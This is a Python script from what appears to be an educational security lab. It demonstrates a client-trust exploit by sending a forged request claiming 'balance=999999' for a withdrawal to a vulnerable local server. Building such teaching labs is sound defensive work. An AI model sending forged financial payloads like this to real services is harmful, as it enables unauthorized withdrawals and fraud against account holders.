# stage1_insecure_protocols/7_client_trust_error/attacker.py

"""
attacker.py - Client Trust Exploit Demonstration

This script simulates an attack where a client forges a financial field (`balance`)
in the request payload to trick a vulnerable server into accepting an unauthorized
withdrawal. The server blindly trusts client-supplied data without performing any
server-side validation or verification.

Vulnerabilities Exploited:
- Trusting client-side values for sensitive financial fields.
- Lack of server-side validation of business-critical logic.
- No cross-checking of claimed balance with actual account records.

Educational Purpose:
This script is used to demonstrate how trusting user input in business logic
(rather than just authentication) can lead to serious financial vulnerabilities.

Usage:
    python attacker.py --port 9000
"""

import argparse

from config import DEFAULT_HOST

from utils.attacker_runner import run_tcp_attack

parser = argparse.ArgumentParser()
parser.add_argument("--port", type=int, required=True, help="Port to connect to")
args = parser.parse_args()

server_host = DEFAULT_HOST
server_port = args.port

# Construct a forged transaction with an exaggerated balance value
plain_text = "username=alice&balance=999999&action=withdraw"
message = plain_text

# Send the malicious request to exploit server trust in client-supplied balance
response = run_tcp_attack(
    host=server_host,
    port=server_port,
    plain_text=plain_text,
    payload=message,
    verbose=True
)

print()